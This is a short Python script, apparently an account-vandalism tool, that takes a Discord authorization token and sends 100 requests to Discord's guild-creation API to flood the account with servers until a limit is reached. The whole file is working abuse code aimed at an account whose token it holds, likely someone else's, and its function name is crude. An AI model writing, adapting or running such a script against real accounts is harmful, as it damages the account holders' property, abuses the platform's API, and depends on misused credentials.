import requests
def fuck_account(token, server_name):
    for _ in range(0,100):
        try:
            print(_)
            requests.post(
                url="https://discordapp.com/api/v6/guilds",
                json={
                    "icon": "null",
                    "name": str(server_name),
                    "region": "russia"
                },
                headers={"Authorization":token}
            )
        except: print("Server Limit Reached")